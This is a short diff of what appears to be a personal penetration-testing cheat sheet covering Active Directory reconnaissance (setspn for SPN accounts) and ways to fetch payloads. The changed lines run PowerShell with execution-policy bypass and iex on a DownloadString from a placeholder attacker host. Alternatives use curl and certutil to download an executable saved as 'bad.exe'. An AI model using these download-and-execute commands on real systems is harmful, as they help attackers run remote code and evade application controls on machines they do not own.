@@ -17,8 +17,7 @@ setspn -T medin -Q ​ */*  //to extract all accouint in SPN, when we have a nor
 #### AppLocker is an application whitelisting technology introduced with Windows 7
   
 //pwershell to downlaod file
-      powershell -ep bypass;
-      iex​(New-Object Net.WebClient).DownloadString('https://YOUR_IP/xx')
+      powershell.exe -ep bypass; iex​(New-Object Net.WebClient).DownloadString('http://YOUR_IP/xx')
       or curl http://xxx/xx -o xx
       or certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
   >net accounts    /login policy
